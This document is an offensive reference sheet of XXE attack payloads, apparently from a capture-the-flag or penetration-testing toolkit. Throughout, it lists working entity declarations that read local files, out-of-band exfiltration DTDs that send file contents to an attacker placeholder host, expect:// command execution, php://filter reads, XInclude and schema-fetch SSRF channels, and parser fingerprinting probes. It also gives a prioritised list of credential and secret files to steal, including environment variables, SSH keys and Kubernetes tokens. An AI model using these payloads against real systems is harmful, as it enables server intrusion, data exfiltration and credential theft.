# Extended Corpus — the long tail of XXE variants

This file is the reference shelf — every named shape, parser quirk,
and payload form that didn't fit a dedicated module. Work it by section,
not cover to cover.

---

## Section 1 — The entity-declaration family

### Internal general entity

```xml
<!ENTITY x "value">                  <!-- literal -->
<r>&x;</r>
```

### External general entity — the file/URL read

```xml
<!ENTITY x SYSTEM "file:///etc/passwd">
<!ENTITY x SYSTEM "http://host/path">
<!ENTITY x PUBLIC "-//X//EN" "file:///etc/passwd">   <!-- PUBLIC fallback -->
<r>&x;</r>
```

`PUBLIC` needs a public ID literal AND a system URI — the parser tries
public first, falls back to system — the system URI is still a fetch.

### Parameter entity (internal)

```xml
<!ENTITY % p "value">
%p;
```

Only usable inside the DTD — `&p;` in the body is a parse error.

### External parameter entity — the OOB carrier

```xml
<!ENTITY % p SYSTEM "http://YOU/dtd">
%p;
```

### Nested parameter entities

```xml
<!ENTITY % a "foo">
<!ENTITY % b "%a;bar">            <!-- %a; expands inside %b;'s value -->
```

Param entities inside param-entity values — the engine of blind exfil.

### The `&#x;`/`&#NN;` numeric refs — inline in values

```xml
<!ENTITY x "&#60;&#62;">          <!-- '<>' -->
```

Numeric character references are NOT entities — they decode at parse
time. Useful to smuggle `<`/`>`/`&`/`%` into an entity VALUE:

```xml
<!ENTITY % e "<!ENTITY &#37; s SYSTEM 'file:///flag'>">
```

`&#37;` = `%` — builds a nested param-entity reference inside a value —
the error-exfil trick's engine.

### Entity redeclaration — last-wins

```xml
<!ENTITY x "first">
<!ENTITY x "second">             <!-- some parsers take first, some last -->
<r>&x;</r>
```

Parser-dependent — Xerces first-wins, libxml2 errors — fingerprinting.

### The `ATTLIST`/`ELEMENT`/`NOTATION` declarations — DTD features that fetch

```xml
<!ATTLIST r a CDATA "&x;">        <!-- default attribute value with entity -->
<!ELEMENT r ANY>
<!NOTATION n SYSTEM "file:///etc/passwd">
<!ATTLIST r a ENTITY "x">
```

`NOTATION SYSTEM` = a fetch. `ATTLIST` default values can inject entities.
`ATTLIST a ENTITY` = unparsed-entity attribute — the entity gets
evaluated into the attribute.

### Unparsed entities — `NDATA`

```xml
<!NOTATION n SYSTEM "x">
<!ENTITY u SYSTEM "file:///flag" NDATA n>
<r a="u"/>
```

`NDATA` = unparsed entity — the entity content is fetched but NOT
parsed — bypasses the "file content breaks the parse" problem for
some parsers (the content is returned as unparsed data).

---

## Section 2 — The DOCTYPE family

### Inline DOCTYPE with no entities — DTD-only declaration

```xml
<!DOCTYPE r [ <!ELEMENT r ANY> ]>
```

### External DOCTYPE — whole DTD remote

```xml
<!DOCTYPE r SYSTEM "http://YOU/d.dtd">
<!DOCTYPE r PUBLIC "-//X//EN" "http://YOU/d.dtd">
```

The whole DTD is fetched — entities inside it become available. The
`PUBLIC`+system-id form: parser tries the public-id resolution first,
falls back to the system URI — the fetch happens either way.

### The internal+external hybrid

```xml
<!DOCTYPE r SYSTEM "http://YOU/d.dtd" [
  <!ENTITY x "local">
]>
```

Internal subset wins over external for same-named entities — merge
behavior.

### No DOCTYPE at all — XInclude/processing-instruction path

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///flag" parse="text"/>
</r>
```

`parse="text"` = raw text — `parse="xml"` = parsed (would re-expand
entities inside the included doc — recursive XXE).

---

## Section 3 — The URI-scheme family

### `file:` — path forms per OS

```
file:///etc/passwd               POSIX
file:///c:/windows/win.ini       Windows forward-slash
file:///c%3A/windows/win.ini     encoded drive letter — some parsers
file:///c:/windows/system32/drivers/etc/hosts
file:/etc/passwd                 single-slash — some accept
file:////etc/passwd              extra-slash
/etc/passwd                      bare path — treated as relative file
file:///proc/self/cmdline        proc
file:///proc/1/environ
file:///proc/self/fd/0           fd
file:///dev/stdin
file:///dev/urandom              — DoS-ish, hangs
file:///var/log/apache2/access.log
file:///var/log/nginx/access.log
file:///home/*/.ssh/id_rsa       — glob? no, literal — try common names
```

### `php://` — PHP stream family

```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=http://internal/x
php://filter/read=convert.base64-encode/resource=/flag
php://filter/convert.iconv.utf-8.utf-16/resource=/flag
php://filter/zlib.deflate/convert.base64-encode/resource=/flag
php://filter/convert.quoted-printable-encode/resource=/flag
php://filter/convert.base64-encode/convert.base64-encode/resource=/flag
php://input                     — the request body itself
php://output
php://stdin
php://fd/3 .. php://fd/N
php://memory
php://temp
php://filter/convert.iconv.UCS-4LE.UCS-4|convert.base64-encode/resource=...
```

`iconv` charset-swap trick — `convert.iconv.UCS-4LE.UCS-4` etc — the
"oracle" variants that leak data through filter-chain side-effects —
`web-sqli`'s `filter-chain-oracle`-style technique applies here too.

### `phar://` — phar metadata deser trigger

```
phar:///path/to/app/upload/x.phar/a
phar://../uploads/x.phar/y
phar:///tmp/x.jpg/y              — a renamed phar still triggers
```

### `expect://` — exec

```
expect://id
expect://cat%20/flag
expect://$IFS$9cat$IFS$9/flag    — $IFS space-bypass
```

### `jar:`/`netdoc:` — Java

```
jar:file:///tmp/x.jar!/x
jar:http://YOU/x.jar!/x
jar:file:///app.war!/WEB-INF/web.xml
netdoc:///etc/passwd
netdoc://host/p
```

### `data:` — libxml2

```
data:text/plain,hello
data:text/plain;base64,aGVsbG8=
data:,text
```

Used as an external-DTD URI — embeds the DTD inline, no fetch needed.

### `ftp:` — the legacy channel

```
ftp://YOU/file
ftp://USER:PASS@host/file
ftp://anonymous:anon@host/file
```

### `smb`/UNC — Windows

```
file://\\YOU\share\x
file://\\127.0.0.1\c$\windows\win.ini
\\YOU\share\x
```

### The gopher/dict/ldap/tftp/sftp tiers

```
gopher://host:port/_payload      — old JDK, some libxml2+curl
dict://host:port/d:word
ldap://host:port/dn
tftp://host/file
sftp://user:pass@host/path       — curl-backed builds
scp://user@host/path
```

Parser-dependent — check `protocol-handlers.md` matrix.

---

## Section 4 — The OOB-exfil composition family

### The classic exfil-DTD

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU/?d=%file;'>">
%wrap;
```

`%file;` reads → `%wrap;` builds `<!ENTITY send SYSTEM 'http://YOU/?d=<content>'>`
→ `&send;` (or `%send;` depending on entity type) fetches the URL.

### The param-only variant — no general entity in the body

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://YOU/?d=%file;'>">
%wrap;
%send;
```

`&#37;` = `%` — builds a param-entity `send` — `%send;` inside the DTD
itself fires the fetch — no `&send;` needed in the body at all.

### The URL-encode-free variant — carry content in path not query

```dtd
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://YOU/%file;'>">
```

Path vs query — a file with `?`/`&` in the content breaks a query
but might survive a path segment.

### The hostname-exfil — shortest payload

```dtd
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://%file;.YOU/'>">
```

File content becomes a DNS label — only short clean content survives
(DNS label rules: alnum+dash, ≤63 chars) — use for short flags/secrets.

### The error-channel variant — no listener needed

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#37; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```

File content lands in the `FileNotFoundException`/`no such file` URI.

### The local-DTD-hijack variant — zero egress

`local-dtd-hijack.md` — redefine an entity inside a DTD already on the
target disk — `file:///usr/share/.../docbookx.dtd` —
`%ISOtech`-redefine is the classic.

---

## Section 5 — The XInclude family

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
</r>
```

```xml
<xi:include href="file:///flag" parse="text"/>          — raw text
<xi:include href="file:///x.xml" parse="xml"/>          — parsed (recursive)
<xi:include href="file:///x" parse="text" encoding="UTF-8"/>
<xi:include href="/etc/passwd" parse="text"/>           — bare path
<xi:include href="php://filter/convert.base64-encode/resource=/flag" parse="text"/>
<xi:include href="http://internal/" parse="text"/>      — SSRF via XInclude
```

`parse="xml"` triggers re-parse — if the included doc has entities,
they expand — recursive XXE through XInclude.

### XInclude + xpointer

```xml
<xi:include href="file:///x" parse="xml" xpointer="xpointer(/root/elem)"/>
```

`xpointer` selects a fragment of the included doc — read a slice of a
remote XML.

---

## Section 6 — The processing-instruction family

```xml
<?xml-stylesheet type="text/xsl" href="http://YOU/x.xsl"?>
<?xml-stylesheet href="file:///x.xsl"?>
<?xml-model href="http://YOU/x.rng"?>
<?xpacket begin=""?>
```

`xml-stylesheet` = XSLT fetch — `xxe-to-rce.md`.
`xml-model` = schema fetch — an OOB channel.

---

## Section 7 — The schema-import family

```xml
<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <xsd:import namespace="x" schemaLocation="http://YOU/s.xsd"/>
  <xsd:include schemaLocation="http://YOU/s.xsd"/>
  <xsd:redefine schemaLocation="http://YOU/s.xsd"/>
</xsd:schema>
```

A schema-validating parser fetches `schemaLocation` — the OOB/SSRF
channel through XSD — fires when the app validates the doc against a
schema.

---

## Section 8 — The attribute-context entities

```xml
<r attr="&x;"/>
<r attr="file:///flag&x;"/>
<r attr="&x;&x;&x;"/>                <!-- amplification -->
```

Entities in attribute values expand — the attribute becomes the exfil
carrier when the body-echo is suppressed.

### The ATTLIST-default injection — inject the attribute itself

```xml
<!DOCTYPE r [
  <!ATTLIST r a CDATA "&x;">
  <!ENTITY x SYSTEM "file:///flag">
]>
<r/>
```

The default attribute `a` gets the entity — `<r/>` has no `a` but the
parser supplies the default → the expanded value lands in the DOM attr.

---

## Section 9 — The namespace/DTD-in-element exotic

### DTD inside a comment — no, comments don't parse

### Entity inside CDATA — no, CDATA is literal

### The `xml:base` relative-resolution

```xml
<r xml:base="file:///">
  <xi:include href="etc/passwd" parse="text"/>
</r>
```

`xml:base` sets the resolution base for relative URIs in scope —
`etc/passwd` resolves to `file:///etc/passwd`.

### The nested-DTD — external subset + internal subset

External subset fetched first, then internal — internal overrides —
the hybrid lets you define entities BOTH places.

---

## Section 10 — The "file doesn't exist vs can't read" probes

```
file:///definitely-not-a-file-xyz        — existence oracle — error vs empty
file:///etc/shadow                       — permission oracle — empty vs denied
file:///root/flag                        — is the parser running as root?
file:///proc/self/status                 — parser's UID in status
file:///proc/self/cwd                    — process working dir
file:///proc/self/exe                    — parser binary path
file:///proc/self/maps                   — mapped libs
```

`/proc/self/*` is the fingerprint mine — tells you the parser's process.

---

## Section 11 — The "which file to read first" corpus

```
/etc/passwd                — proves it, names users
/etc/hostname              — container name
/etc/hosts                 — network neighbors
/proc/self/environ         — env vars — DB creds, secrets
/proc/self/cmdline         — the process command
/proc/net/tcp              — open ports/services
/var/www/html/index.php    — source
/var/www/.env
/app/config.yml
/opt/app/config.ini
/home/*/.bash_history      — try common users
/root/.bash_history
/root/flag.txt /flag /flag.txt
/run/secrets/*             — docker/k8s secrets
/var/run/secrets/kubernetes.io/serviceaccount/token
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\boot.ini
C:\Users\*\Desktop\flag.txt
```

The order: `passwd`→`environ`→source→config→flag — each read informs
the next path.

---

## Section 12 — The composition patterns — real-world layering

### PHP `php://filter` + XXE + base64 — the binary-safe read

```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/flag">
```

b64 = XML-safe — no `<`/`&` problem — the cleanest PHP read.

### The `zlib.deflate`+`base64` — the big-file read

```xml
<!ENTITY x SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/log/big.log">
```

### The "the flag is in a source file you read first" — chain

Read `index.php` → find the flag-in-constant/`getenv`/`include`-path
→ follow the path → flag. Source-read drives the next read.

### The "flag in a URL-param only the app fills" — SSRF-to-self

`file://` reads don't see runtime params — hit the app's own endpoint
`http://127.0.0.1/?debug` — the app fills it — `ssrf-via-xxe.md`.

### The "the DTD's own entity is the flag" — the flag IS an entity name

A challenge whose flag is baked into a provided DTD as an entity name —
`%flag;`-as-name — read the provided DTD's entity definitions.

### The "the flag is in a DTD comment" — comments parse

`<!DOCTYPE r [<!-- flag{...} -->]>` — a challenge may hide the flag in
a DTD comment — reading the raw DTD (via a source file or a `data:`-echo)
surfaces it.

---

## Section 13 — The parser-behavior matrix — the deep table

| Behavior | Xerces | .NET | libxml2 | ElementTree | lxml | Go |
|---|---|---|---|---|---|---|
| internal `&x;` | ✓ | ✓ | ✓ | ✓ | ✓ | ✗ |
| `&x;` in attr | ✓ | ✓ | ✓ | ✓ | ✓ | ✗ |
| ext `file:` | ✓ | with resolver | ✓ | ✗ | ✓ | ✗ |
| ext `http:` | ✓ | with resolver | ✓ | ✗ | ✓ | ✗ |
| param `%x;` | ✓ | ✓ | ✓ | ✗ | ✓ | ✗ |
| ext param DTD | ✓ | with resolver | ✓ | ✗ | ✓ | ✗ |
| param-in-ext-subset compose | strict | strict | lax | ✗ | lax | ✗ |
| `NDATA` unparsed | ✓ | ✓ | ✓ | ✗ | ✓ | ✗ |
| `data:` URI | ✗ | ✗ | ✓ | ✗ | ✓ | ✗ |
| `php://` | ✗ | ✗ | PHP | ✗ | PHP | ✗ |
| `expect://` | ✗ | ✗ | PHP | ✗ | PHP | ✗ |
| `jar:`/`netdoc:` | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `ftp:` | ✓ | ✓ | ✓ | ✗ | ✓ | ✗ |
| `gopher:` | old | ✗ | curl | ✗ | curl | ✗ |
| XInclude | opt | opt | opt | opt | opt | ✗ |
| dir-listing `file://dir/` | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| UTF-7/EBCDIC | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| Billion-Laughs | capped | capped | capped | vulnerable | capped | immune |

`lax` vs `strict` for the param-in-ext-subset compose is the line that
separates "external-DTD needed" from "internal-subset composition works"
— libxml2 allows `%a;`-in-value in internal subset where Xerces rejects.

---

## Section 14 — The "the app is not even a parser" — places XXE hides

- A `signature-verification` step that runs `XMLSignature.parse` on
  your doc BEFORE checking — the verify-path parse = XXE surface
- A `canonicalization` (C14N) step — C14N itself parses
- An `xpath` evaluator fed a whole doc — the doc parse fires
- A `DocumentBuilderFactory` used JUST to read a namespace — still parses
- A `xml.bind`/`JAXB` unmarshaller behind a REST endpoint
- A `convert xml→json` endpoint — the conversion parses

## Section 15 — The response-channel enumeration — where does content land

- the body text of a custom element — `<r>&x;</r>` → the `<r>` text
- an attribute value — `<r a="&x;"/>` → the `a` attr in the DOM
- a SOAP `<faultstring>` — the parse-error channel
- an XML `Location:`/`Content-Location` header — if the app builds one
  from your entity URI
- the rendered document — a converted PDF/thumbnail/text-extract
- the OOB query/path/DNS — blind exfil
- the parser's own error — `error-based.md`

## Section 16 — The fingerprint probes — which parser, measured

```xml
<!DOCTYPE r [<!ENTITY % a "<!ENTITY % b SYSTEM 'x'>"> %a;]><r/>
```

- works (parses) → libxml2-style lax → PHP/Python/Ruby
- `Entity 'b' was not found`/rejects → strict Xerces/.NET → Java/.NET

```xml
<r>&undefined;</r>
```

- `Entity 'undefined' not defined` → libxml2
- `The entity "undefined" was referenced` → Xerces
- `Reference to undeclared entity` → .NET
- `undefined entity` → Expat/Python

Record which error phrase lands → `parser-specifics.md` table.
